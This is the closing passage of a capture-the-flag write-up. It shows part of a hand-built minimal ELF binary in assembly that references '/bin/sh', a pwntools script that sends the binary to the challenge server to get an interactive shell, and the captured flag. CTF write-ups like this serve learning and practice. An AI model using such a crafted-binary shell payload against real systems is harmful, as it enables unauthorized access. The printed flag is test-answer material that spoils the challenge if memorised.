                                                ; e_phentsize
                dw      1                       ; e_phnum       ; p_paddr
                dw      0                       ; e_shentsize
                dd      filesize                ; e_shnum       ; p_filesz
                                                ; e_shstrndx
                dd      filesize                                ; p_memsz
                dd      5                                       ; p_flags
                dd      0x1000                                  ; p_align
  
  filesize      equ     $ - $$
SECTION .data
    msg db "/bin/sh"
```
We need to pad the end with null bytes just to prevent a few issues, but we can read the ELF and send it over:
```py
from pwn import *

p = remote('amt.rs', 31179)
bytestream = open('b.out', 'rb').read()
print(bytestream)
p.recvuntil('!\n')
p.sendline(bytestream+b'\0'*10)
p.interactive()
```
We send the ELF and pop a shell to read the flag: `amateursCTF{d1d_i_f0rg3t_t0_p4tch_32b1t_b1naries_t00!!!}`
